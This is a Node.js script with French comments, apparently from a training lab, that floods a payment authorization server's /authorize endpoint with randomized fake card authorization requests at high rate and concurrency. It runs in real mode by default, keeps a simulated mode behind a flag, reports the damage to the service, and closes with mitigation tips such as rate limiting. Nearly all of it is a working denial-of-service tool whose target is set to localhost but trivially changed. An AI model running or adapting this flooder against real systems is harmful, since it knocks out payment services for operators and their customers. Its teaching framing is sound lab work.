/**
 * Scénario 5 : DoS Attack
 * EXPLOIT : Flood du serveur d'autorisation
 * 
 * ⚠️ USAGE PÉDAGOGIQUE UNIQUEMENT
 * 
 * Usage: node auth-flooder.js [--simulate]
 */

const http = require('http');
const https = require('https');
const crypto = require('crypto');

// Configuration de l'attaque
const CONFIG = {
    targetHost: '127.0.0.1',
    targetPort: 8583,
    requestsPerSecond: 1000,
    duration: 10,  // secondes
    concurrent: 100,
    simulate: false  // Mode reel par defaut
};

// Statistiques
const stats = {
    sent: 0,
    success: 0,
    errors: 0,
    timeouts: 0,
    startTime: null,
    responsesTimes: []
};

/**
 * Génère une requête d'autorisation factice
 */
function generateAuthRequest() {
    return {
        mti: '0100',
        pan: `4${crypto.randomBytes(7).toString('hex').substring(0, 15)}`,
        processingCode: '000000',
        amount: Math.floor(Math.random() * 100000).toString().padStart(12, '0'),
        stan: crypto.randomBytes(3).toString('hex').toUpperCase(),
        dateTime: new Date().toISOString(),
        terminalId: `TERM${Math.floor(Math.random() * 1000).toString().padStart(4, '0')}`
    };
}

/**
 * Envoie une requête (mode réel)
 */
function sendRequest(request) {
    return new Promise((resolve, reject) => {
        const startTime = Date.now();

        const options = {
            hostname: CONFIG.targetHost,
            port: CONFIG.targetPort,
            path: '/authorize',
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            timeout: 5000
        };

        const req = http.request(options, (res) => {
            const responseTime = Date.now() - startTime;
            stats.responsesTimes.push(responseTime);
            stats.success++;
            resolve({ status: res.statusCode, time: responseTime });
        });

        req.on('error', (err) => {
            stats.errors++;
            reject(err);
        });

        req.on('timeout', () => {
            stats.timeouts++;
            req.destroy();
            reject(new Error('Timeout'));
        });

        req.write(JSON.stringify(request));
        req.end();
        stats.sent++;
    });
}

/**
 * Simule une requête (sans réseau)
 */
async function simulateRequest(request) {
    stats.sent++;

    // Simuler un temps de réponse
    const baseTime = 50;

    // Plus le serveur est chargé, plus les temps augmentent
    const loadMultiplier = Math.min(stats.sent / 100, 10);
    const responseTime = baseTime * loadMultiplier + Math.random() * 50;

    await new Promise(resolve => setTimeout(resolve, Math.min(responseTime, 100)));

    // Simuler des échecs sous forte charge
    if (loadMultiplier > 5 && Math.random() > 0.5) {
        stats.timeouts++;
        throw new Error('Simulated timeout due to overload');
    }

    stats.success++;
    stats.responsesTimes.push(responseTime);

    return { status: 200, time: responseTime };
}

/**
 * Lance le flood
 */
async function flood() {
    console.log('═'.repeat(60));
    console.log('  💀 ATTAQUE DoS - Scénario 5');
    console.log('  ⚠️  USAGE STRICTEMENT PÉDAGOGIQUE');
    console.log('═'.repeat(60));

    console.log(`\n📋 Configuration:`);
    console.log(`   Cible: ${CONFIG.targetHost}:${CONFIG.targetPort}`);
    console.log(`   Débit: ${CONFIG.requestsPerSecond} req/s`);
    console.log(`   Durée: ${CONFIG.duration}s`);
    console.log(`   Parallélisme: ${CONFIG.concurrent}`);
    console.log(`   Mode: ${CONFIG.simulate ? 'SIMULATION' : 'RÉEL'}\n`);

    stats.startTime = Date.now();

    const sendFn = CONFIG.simulate ? simulateRequest : sendRequest;
    const totalRequests = CONFIG.requestsPerSecond * CONFIG.duration;
    const batchSize = CONFIG.concurrent;
    const interval = 1000 / (CONFIG.requestsPerSecond / batchSize);

    console.log('🚀 Démarrage du flood...\n');

    // Afficher la progression
    const progressInterval = setInterval(() => {
        const elapsed = (Date.now() - stats.startTime) / 1000;
        const rate = stats.sent / elapsed;
        const avgTime = stats.responsesTimes.length > 0
            ? (stats.responsesTimes.reduce((a, b) => a + b, 0) / stats.responsesTimes.length).toFixed(0)
            : 0;

        process.stdout.write(`\r   Envoyées: ${stats.sent} | Succès: ${stats.success} | Timeout: ${stats.timeouts} | Rate: ${rate.toFixed(0)}/s | Latence: ${avgTime}ms   `);
    }, 200);

    // Envoyer les requêtes par batch
    let batchCount = 0;
    while (batchCount < totalRequests / batchSize) {
        const batch = [];
        for (let i = 0; i < batchSize; i++) {
            const request = generateAuthRequest();
            batch.push(sendFn(request).catch(() => { }));
        }

        await Promise.allSettled(batch);
        batchCount++;

        // Petit délai entre les batches
        await new Promise(resolve => setTimeout(resolve, interval / 10));
    }

    clearInterval(progressInterval);

    // Résumé
    const elapsed = (Date.now() - stats.startTime) / 1000;
    const avgTime = stats.responsesTimes.length > 0
        ? (stats.responsesTimes.reduce((a, b) => a + b, 0) / stats.responsesTimes.length).toFixed(2)
        : 0;
    const maxTime = stats.responsesTimes.length > 0
        ? Math.max(...stats.responsesTimes).toFixed(2)
        : 0;

    console.log('\n\n' + '═'.repeat(60));
    console.log('  📊 RÉSULTATS DE L\'ATTAQUE');
    console.log('═'.repeat(60));
    console.log(`
  Durée totale:     ${elapsed.toFixed(2)}s
  Requêtes envoyées: ${stats.sent}
  Débit réel:        ${(stats.sent / elapsed).toFixed(0)} req/s
  
  Réponses:
    Succès:   ${stats.success} (${(stats.success / stats.sent * 100).toFixed(1)}%)
    Timeout:  ${stats.timeouts} (${(stats.timeouts / stats.sent * 100).toFixed(1)}%)
    Erreurs:  ${stats.errors} (${(stats.errors / stats.sent * 100).toFixed(1)}%)
  
  Latences:
    Moyenne:  ${avgTime} ms
    Maximum:  ${maxTime} ms
`);

    // Analyse de l'impact
    console.log('─'.repeat(60));
    console.log('  💥 IMPACT SUR LE SERVICE:');
    console.log('─'.repeat(60));

    const timeoutRate = stats.timeouts / stats.sent;
    if (timeoutRate > 0.3) {
        console.log('  🔴 SERVICE DÉGRADÉ SÉVÈREMENT');
        console.log(`     ${(timeoutRate * 100).toFixed(0)}% des transactions échouent`);
    } else if (timeoutRate > 0.1) {
        console.log('  🟠 SERVICE PARTIELLEMENT IMPACTÉ');
        console.log(`     ${(timeoutRate * 100).toFixed(0)}% des transactions échouent`);
    } else {
        console.log('  🟢 SERVICE RÉSILIENT');
        console.log('     Le système a absorbé la charge');
    }

    console.log('\n' + '─'.repeat(60));
    console.log('  💡 SOLUTION:');
    console.log('─'.repeat(60));
    console.log(`
  1. Rate limiting: Limiter à 100 req/s par source
  2. Circuit breaker: Bloquer si latence > 500ms
  3. Queue: Limiter la file d'attente
  4. Auto-scale: Infrastructure élastique
`);
    console.log('═'.repeat(60) + '\n');
}

// Execution
if (process.argv.includes('--simulate')) {
    CONFIG.simulate = true;
    console.log('Mode simulation active. Utilisez --real (ou aucun flag) pour attaquer en mode reel.');
} else if (process.argv.includes('--real')) {
    CONFIG.simulate = false;
    console.log('Mode reel active.');
}

flood().catch(console.error);

module.exports = { generateAuthRequest, flood, stats };

